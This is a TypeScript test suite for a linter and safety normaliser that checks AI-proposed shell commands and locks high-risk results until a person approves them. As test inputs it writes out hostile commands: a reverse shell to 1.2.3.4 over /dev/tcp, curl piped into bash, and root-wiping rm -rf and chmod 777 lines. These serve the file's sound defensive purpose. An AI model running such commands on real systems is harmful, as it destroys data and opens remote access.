import assert from "node:assert/strict";
import { test } from "node:test";
import { isLocked } from "./approval.ts";
import { runGeneration } from "./ai.server.ts";
import { toMarkdownExport, toTextExport } from "./export.ts";
import { normalizeModelPayload } from "./normalize.ts";
import {
  applyQuality,
  computeGaps,
  gapText,
  lintArtifact,
  lintCommand,
  lintSeverity,
  lintText,
} from "./quality.ts";
import { resetRateLimits } from "./rate-limit.ts";
import type { CommandProposal, OsTarget, RiskLevel, TaskInput, TaskResult } from "./types.ts";

function lint(command: string, extra: { os?: string; target?: OsTarget; risk?: RiskLevel } = {}) {
  return lintCommand(command, {
    declaredOs: extra.os ?? "any",
    targetOs: extra.target ?? "any",
    risk: extra.risk ?? "low",
  });
}

// ── lintCommand ──
test("clean read-only commands produce no findings", () => {
  for (const command of [
    "df -h",
    "ps aux | grep nginx",
    "tail -n 50 /var/log/syslog",
    "git status",
  ]) {
    assert.deepEqual(lint(command, { os: "linux", target: "linux" }), [], command);
  }
});

test("unbalanced quotes are caught, balanced ones and comments are not", () => {
  assert.ok(lint(`echo "hello`).includes("unbalanced_quotes"));
  assert.ok(lint(`grep 'abc file.txt`).includes("unbalanced_quotes"));
  assert.deepEqual(lint(`echo "it's fine"`), []);
  assert.deepEqual(lint(`echo ok # it's a comment`), []);
  assert.deepEqual(lint(`echo "a \\" b"`), []);
});

test("unbalanced brackets are caught", () => {
  assert.ok(lint("echo $(date").includes("unbalanced_brackets"));
  assert.ok(lint("echo ${HOME").includes("unbalanced_brackets"));
  assert.deepEqual(lint("echo $(date +%F)"), []);
});

test("heredocs and case statements do not cause false syntax errors", () => {
  assert.deepEqual(lint("cat <<'EOF'\nit's (fine\nEOF"), []);
  assert.deepEqual(lint('case "$1" in\n  start) echo up ;;\n  stop) echo down ;;\nesac'), []);
});

test("OS mismatch: Linux tools on Windows and PowerShell on Linux", () => {
  assert.ok(lint("sudo apt install nginx", { target: "windows" }).includes("os_mismatch"));
  assert.ok(lint("systemctl status nginx", { os: "windows" }).includes("os_mismatch"));
  assert.ok(
    lint("Get-Service | Where-Object Status -eq Running", { target: "linux" }).includes(
      "os_mismatch",
    ),
  );
  assert.ok(lint("brew install jq", { target: "linux" }).includes("os_mismatch"));
  assert.ok(lint("apt install jq", { target: "macos" }).includes("os_mismatch"));
  assert.ok(lint("ipconfig /all", { os: "linux" }).includes("os_mismatch"));
});

test("OS match produces no mismatch", () => {
  assert.ok(!lint("Get-Service", { target: "windows", os: "windows" }).includes("os_mismatch"));
  assert.ok(!lint("df -h", { target: "linux", os: "linux" }).includes("os_mismatch"));
  assert.ok(!lint("brew list", { target: "macos", os: "macos" }).includes("os_mismatch"));
  assert.ok(!lint("df -h", { target: "any", os: "any" }).includes("os_mismatch"));
});

test("a command declared for a different OS than the target is a mismatch", () => {
  assert.ok(lint("echo hi", { os: "windows", target: "linux" }).includes("os_mismatch"));
});

test("unquoted variables in destructive commands are warned about", () => {
  assert.ok(lint("rm -rf $BUILD_DIR/*", { risk: "high" }).includes("unquoted_variable"));
  assert.ok(lint("chmod 640 $FILE", { risk: "medium" }).includes("unquoted_variable"));
  assert.ok(!lint('rm -rf "$BUILD_DIR"/old', { risk: "high" }).includes("unquoted_variable"));
  assert.ok(!lint("Remove-Item $path -WhatIf", { risk: "high" }).includes("unquoted_variable"));
});

test("dangerous root-level targets are errors", () => {
  assert.ok(lint("rm -rf /", { risk: "high" }).includes("root_target"));
  assert.ok(lint("rm -rf /*", { risk: "high" }).includes("root_target"));
  assert.ok(lint("rm -rf ~", { risk: "high" }).includes("root_target"));
  assert.ok(lint("rm -rf $HOME/", { risk: "high" }).includes("root_target"));
  assert.ok(lint("chmod -R 777 /", { risk: "high" }).includes("root_target"));
  assert.ok(lint("rm -rf --no-preserve-root /tmp/x", { risk: "high" }).includes("root_target"));
  assert.ok(lint("Remove-Item -Recurse -Force C:\\", { risk: "high" }).includes("root_target"));
  assert.ok(!lint("rm -rf /var/www/old", { risk: "high" }).includes("root_target"));
});

test("placeholders that were never filled in are flagged", () => {
  assert.ok(lint("scp file <user>@<host>:/tmp").includes("placeholder"));
  assert.ok(lint("curl https://example.com/api").includes("placeholder"));
  assert.ok(lint("export KEY=your_key_here").includes("placeholder"));
  assert.ok(!lint("curl https://api.mycompany.io/v1").includes("placeholder"));
});

test("a missing dry-run is noted only for risky commands that have one", () => {
  assert.ok(lint("rsync -a src/ dest/", { risk: "medium" }).includes("no_dry_run"));
  assert.ok(!lint("rsync -an src/ dest/", { risk: "medium" }).includes("no_dry_run"));
  assert.ok(!lint("rsync -a --dry-run src/ dest/", { risk: "medium" }).includes("no_dry_run"));
  assert.ok(lint("Remove-Item old.log", { risk: "high" }).includes("no_dry_run"));
  assert.ok(!lint("Remove-Item old.log -WhatIf", { risk: "high" }).includes("no_dry_run"));
  assert.ok(lint("terraform apply", { risk: "high" }).includes("no_dry_run"));
  assert.ok(lint("kubectl apply -f a.yaml", { risk: "high" }).includes("no_dry_run"));
  assert.ok(
    !lint("kubectl apply -f a.yaml --dry-run=client", { risk: "high" }).includes("no_dry_run"),
  );
  assert.ok(lint("git clean -fd", { risk: "high" }).includes("no_dry_run"));
  assert.ok(!lint("git clean -fdn", { risk: "high" }).includes("no_dry_run"));
  assert.ok(lint("ansible-playbook site.yml", { risk: "high" }).includes("no_dry_run"));
  // Low-risk commands never get the note.
  assert.ok(!lint("rsync -a src/ dest/", { risk: "low" }).includes("no_dry_run"));
});

test("insecure flags are warned about", () => {
  assert.ok(lint("curl -k https://internal.mycompany.io").includes("insecure_flag"));
  assert.ok(lint("wget --no-check-certificate https://a.mycompany.io/x").includes("insecure_flag"));
  assert.ok(lint("ssh -o StrictHostKeyChecking=no host").includes("insecure_flag"));
  assert.ok(lint("chmod 777 /srv/app").includes("insecure_flag"));
  assert.ok(lint("Set-ExecutionPolicy Bypass").includes("insecure_flag"));
});

test("piping a download into a shell is an error", () => {
  assert.ok(lint("curl -fsSL https://get.mycompany.io/i.sh | bash").includes("pipe_to_shell"));
  assert.ok(!lint("curl -fsSL https://get.mycompany.io/i.sh -o i.sh").includes("pipe_to_shell"));
});

test("severity and text exist for every code, in both languages", () => {
  const codes = [
    "unbalanced_quotes",
    "unbalanced_brackets",
    "os_mismatch",
    "unquoted_variable",
    "root_target",
    "placeholder",
    "no_dry_run",
    "insecure_flag",
    "pipe_to_shell",
    "invalid_json",
    "missing_strict_mode",
    "yaml_tabs",
    "unpinned_action",
  ];
  for (const code of codes) {
    assert.ok(["error", "warn", "info"].includes(lintSeverity(code)), code);
    assert.notEqual(lintText(code, "tr"), code);
    assert.notEqual(lintText(code, "en"), code);
    assert.notEqual(lintText(code, "tr"), lintText(code, "en"));
  }
  for (const code of [
    "no_validation",
    "no_rollback",
    "command_no_rollback",
    "command_no_impact",
    "no_readonly_first",
    "lint_errors",
    "empty_plan",
  ]) {
    assert.notEqual(gapText(code, "tr"), code);
    assert.notEqual(gapText(code, "en"), gapText(code, "tr"));
  }
  assert.equal(lintSeverity("root_target"), "error");
  assert.equal(lintSeverity("no_dry_run"), "info");
});

// ── lintArtifact ──
test("invalid JSON artifacts are caught", () => {
  assert.deepEqual(
    lintArtifact({ language: "json", filename: "a.json", content: '{"a": 1}' }, "any"),
    [],
  );
  assert.ok(
    lintArtifact({ language: "json", filename: "a.json", content: '{"a": 1,}' }, "any").includes(
      "invalid_json",
    ),
  );
  assert.ok(
    lintArtifact({ language: "text", filename: "pkg.json", content: "{oops" }, "any").includes(
      "invalid_json",
    ),
  );
  assert.deepEqual(
    lintArtifact({ language: "jsonc", filename: "t.json", content: '{"a": 1, // note\n}' }, "any"),
    [],
  );
});

test("YAML: tabs are errors and unpinned actions are warned", () => {
  const tabs = "jobs:\n\tbuild:\n\t\truns-on: ubuntu-latest\n";
  assert.ok(
    lintArtifact({ language: "yaml", filename: "ci.yml", content: tabs }, "any").includes(
      "yaml_tabs",
    ),
  );
  const unpinned = "steps:\n  - uses: actions/checkout@main\n";
  assert.ok(
    lintArtifact({ language: "yaml", filename: "ci.yml", content: unpinned }, "any").includes(
      "unpinned_action",
    ),
  );
  const pinned = "steps:\n  - uses: actions/checkout@v4\n";
  assert.deepEqual(
    lintArtifact({ language: "yaml", filename: "ci.yml", content: pinned }, "any"),
    [],
  );
});

test("shell scripts: strict mode is recommended, and findings carry through", () => {
  const loose = "#!/bin/bash\ncd /srv\nls\npwd\nwhoami\ndate\nuptime\n";
  assert.ok(
    lintArtifact({ language: "bash", filename: "a.sh", content: loose }, "linux").includes(
      "missing_strict_mode",
    ),
  );
  const strict = `#!/bin/bash\nset -euo pipefail\ncd /srv\nls\npwd\nwhoami\ndate\nuptime\n`;
  assert.ok(
    !lintArtifact({ language: "bash", filename: "a.sh", content: strict }, "linux").includes(
      "missing_strict_mode",
    ),
  );
  const bad = `#!/bin/bash\nset -euo pipefail\necho "oops\n`;
  assert.ok(
    lintArtifact({ language: "bash", filename: "a.sh", content: bad }, "linux").includes(
      "unbalanced_quotes",
    ),
  );
});

test("PowerShell scripts: $ErrorActionPreference is recommended", () => {
  const loose = "Get-Service\nGet-Process\nGet-Date\nGet-Item .\nGet-Location\nGet-Host\n";
  assert.ok(
    lintArtifact({ language: "powershell", filename: "a.ps1", content: loose }, "windows").includes(
      "missing_strict_mode",
    ),
  );
  const strict = `$ErrorActionPreference = 'Stop'\n${loose}`;
  assert.ok(
    !lintArtifact(
      { language: "powershell", filename: "a.ps1", content: strict },
      "windows",
    ).includes("missing_strict_mode"),
  );
});

test("ordinary source code is not linted as a shell script", () => {
  const ts = 'export const a = (x: number) => x > 3;\nconst s = "it\'s";\n';
  assert.deepEqual(
    lintArtifact({ language: "typescript", filename: "a.ts", content: ts }, "any"),
    [],
  );
});

// ── Completeness ──
function command(overrides: Partial<CommandProposal> = {}): CommandProposal {
  return {
    purpose: "kontrol",
    os: "linux",
    command: "df -h",
    privilege: "none",
    riskLevel: "low",
    impact: "Yok",
    rollback: "Gerekmez",
    approvalRequired: false,
    ...overrides,
  };
}

function result(overrides: Partial<TaskResult> = {}): TaskResult {
  return {
    summary: "s",
    assumptions: ["a"],
    plan: ["p"],
    riskLevel: "low",
    risks: [],
    approvalRequired: false,
    affectedResources: [],
    consequences: [],
    reversible: "yes",
    generatedArtifacts: [],
    commands: [command()],
    installationSteps: [],
    validationSteps: ["Çıktıyı kontrol edin"],
    rollbackPlan: ["Yok"],
    warnings: [],
    finalResponse: "f",
    requirements: [],
    envVars: [],
    disableSteps: [],
    refused: false,
    ...overrides,
  };
}

test("a complete low-risk result has no gaps", () => {
  assert.deepEqual(computeGaps(result()), []);
});

test("missing validation is a gap whenever there is something to validate", () => {
  assert.deepEqual(computeGaps(result({ validationSteps: [] })), ["no_validation"]);
  // Pure explanation with no commands or files needs no validation.
  assert.deepEqual(computeGaps(result({ validationSteps: [], commands: [] })), []);
});

test("risky changes need a rollback plan and per-command rollback and impact", () => {
  const risky = command({
    command: "systemctl restart nginx",
    riskLevel: "medium",
    rollback: "",
  });
  const gaps = computeGaps(
    result({ riskLevel: "medium", commands: [command(), risky], rollbackPlan: [] }),
  );
  assert.ok(gaps.includes("no_rollback"));
  assert.ok(gaps.includes("command_no_rollback"));

  const noImpact = command({ command: "rm -rf /srv/old", riskLevel: "high", impact: "" });
  assert.ok(
    computeGaps(result({ riskLevel: "high", commands: [command(), noImpact] })).includes(
      "command_no_impact",
    ),
  );
});

test("a changing command with no read-only check before it is a gap", () => {
  const change = command({ command: "systemctl restart nginx", riskLevel: "medium" });
  assert.ok(
    computeGaps(result({ riskLevel: "medium", commands: [change] })).includes("no_readonly_first"),
  );
  assert.ok(
    !computeGaps(result({ riskLevel: "medium", commands: [command(), change] })).includes(
      "no_readonly_first",
    ),
  );
});

test("lint errors become a completeness gap; warnings and notes do not", () => {
  const withError = applyQuality(result({ commands: [command({ command: 'echo "oops' })] }), "any");
  assert.ok(withError.gaps?.includes("lint_errors"));
  const withWarning = applyQuality(
    result({ commands: [command({ command: "echo <name>" })] }),
    "any",
  );
  assert.ok(withWarning.commands[0]?.lint?.includes("placeholder"));
  assert.ok(!withWarning.gaps?.includes("lint_errors"));
});

test("an empty plan is a gap, and a refusal never has gaps", () => {
  assert.ok(computeGaps(result({ plan: [] })).includes("empty_plan"));
  assert.deepEqual(computeGaps(result({ refused: true, plan: [], validationSteps: [] })), []);
});

test("applyQuality is idempotent", () => {
  const once = applyQuality(result({ commands: [command({ command: 'echo "oops' })] }), "linux");
  const twice = applyQuality(once, "linux");
  assert.deepEqual(twice, once);
});

// ── Normalising untrusted model output ──
test("model output cannot hide a dangerous command behind a low risk label", () => {
  const out = normalizeModelPayload(
    {
      summary: "Güncelleme",
      riskLevel: "low",
      approvalRequired: false,
      commands: [
        {
          purpose: "kur",
          os: "linux",
          command: "curl https://get.mycompany.io/i.sh | bash",
          riskLevel: "low",
          approvalRequired: false,
        },
        {
          purpose: "temizle",
          os: "linux",
          command: "rm -r /srv/old",
          riskLevel: "low",
          approvalRequired: false,
        },
        {
          purpose: "yayınla",
          os: "linux",
          command: "terraform apply",
          riskLevel: "low",
          approvalRequired: false,
        },
      ],
    },
    "tr",
    "Sunucuyu güncelle",
    { targetOs: "linux" },
  );
  assert.equal(out.riskLevel, "high");
  assert.equal(out.approvalRequired, true);
  assert.ok(out.commands.every((c) => c.riskLevel === "high" && c.approvalRequired));
  assert.ok(out.commands[0]?.lint?.includes("pipe_to_shell"));
});

test("model output with no validation or rollback is reported as incomplete, not silently accepted", () => {
  const out = normalizeModelPayload(
    {
      summary: "Servisi yeniden başlat",
      riskLevel: "medium",
      commands: [
        {
          purpose: "restart",
          os: "linux",
          command: "systemctl restart nginx",
          riskLevel: "medium",
        },
      ],
    },
    "tr",
    "nginx servisini yeniden başlat",
    { targetOs: "linux" },
  );
  assert.ok(out.gaps?.includes("no_validation"));
  assert.ok(out.gaps?.includes("no_rollback"));
  assert.ok(out.gaps?.includes("command_no_rollback"));
  assert.ok(out.gaps?.includes("no_readonly_first"));
});

test("project context is judged as code: identifiers do not inflate risk", () => {
  const out = normalizeModelPayload(
    { summary: "İnceleme", riskLevel: "low", plan: ["oku"], assumptions: ["x"] },
    "tr",
    "Bu bileşeni incele",
    { contextText: "const config = { password: '', mode: 'production' };", targetOs: "any" },
  );
  assert.equal(out.riskLevel, "low");
  assert.equal(out.approvalRequired, false);
});

test("a malware request in the description is refused and carries no commands", () => {
  const out = normalizeModelPayload(
    { summary: "x", commands: [{ command: "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1" }] },
    "tr",
    "keylogger yaz ve kurbana bırak",
  );
  assert.equal(out.refused, true);
  assert.equal(out.commands.length, 0);
  assert.equal(out.approvalRequired, false);
});

// ── Approval lock ──
test("high-risk results stay locked until reviewed; low-risk and refused results never lock", () => {
  const high = result({ riskLevel: "high", approvalRequired: true });
  assert.equal(isLocked({ acknowledged: false, result: high }), true);
  assert.equal(isLocked({ acknowledged: true, result: high }), false);
  assert.equal(isLocked({ acknowledged: false, result: result() }), false);
  assert.equal(
    isLocked({ acknowledged: false, result: result({ approvalRequired: true, refused: true }) }),
    false,
  );
});

// ── End to end through the generation service, with a fake provider ──
const input: TaskInput = {
  title: "Disk temizliği",
  description: "Linux sunucuda eski logları kaldır.",
  category: "sysadmin",
  os: "linux",
  language: "",
  detailLevel: "standard",
  safePreview: true,
  projectContext: "",
  focus: "disk",
  languagePref: "tr",
};

function providerReturning(payload: unknown): typeof fetch {
  return (async () =>
    new Response(JSON.stringify({ choices: [{ message: { content: JSON.stringify(payload) } }] }), {
      status: 200,
    })) as unknown as typeof fetch;
}

test("end to end: a risky live answer is locked, linted and flagged incomplete", async () => {
  resetRateLimits();
  const response = await runGeneration(input, {
    apiKey: "test-key-not-real",
    fetchImpl: providerReturning({
      summary: "Logları sil",
      riskLevel: "low",
      approvalRequired: false,
      plan: ["Sil"],
      assumptions: ["Linux"],
      commands: [
        {
          purpose: "sil",
          os: "linux",
          command: "rm -rf $LOG_DIR/*",
          riskLevel: "low",
          approvalRequired: false,
        },
      ],
    }),
  });
  assert.equal(response.ok, true);
  if (!response.ok) return;
  const { record } = response;
  assert.equal(record.riskLevel, "high");
  assert.equal(record.status, "awaiting_approval");
  assert.equal(isLocked(record), true);
  assert.ok(record.result.commands[0]?.lint?.includes("unquoted_variable"));
  assert.ok(record.result.commands[0]?.lint?.includes("root_target") === false);
  assert.ok(record.result.gaps?.includes("no_validation"));
  assert.ok(record.result.gaps?.includes("command_no_rollback"));
});

test("end to end: demo mode output also passes through the quality checks", async () => {
  resetRateLimits();
  const response = await runGeneration(input, { apiKey: null });
  assert.equal(response.ok, true);
  if (!response.ok) return;
  assert.equal(response.record.source, "demo");
  assert.ok(Array.isArray(response.record.result.gaps));
  assert.ok(response.record.result.commands.every((c) => Array.isArray(c.lint)));
});

test("exports include lint findings and gaps", () => {
  const base = applyQuality(
    result({ validationSteps: [], commands: [command({ command: 'echo "oops' })] }),
    "any",
  );
  const record = {
    schemaVersion: 1 as const,
    id: "11111111-1111-1111-1111-111111111111",
    title: "T",
    description: "d",
    categoryInput: "auto" as const,
    category: "sysadmin" as const,
    os: "any" as const,
    language: "",
    detailLevel: "standard" as const,
    safePreview: true,
    projectContext: "",
    focus: "auto" as const,
    createdAt: "2026-01-01T00:00:00.000Z",
    status: "completed" as const,
    riskLevel: "low" as const,
    source: "demo" as const,
    model: null,
    acknowledged: false,
    result: base,
  };
  const text = toTextExport(record);
  const markdown = toMarkdownExport(record);
  for (const out of [text, markdown]) {
    assert.match(out, /Eksikler/);
    assert.match(out, /Doğrulama adımı yok/);
    assert.match(out, /HATA: Tırnaklar eşleşmiyor/);
  }
});
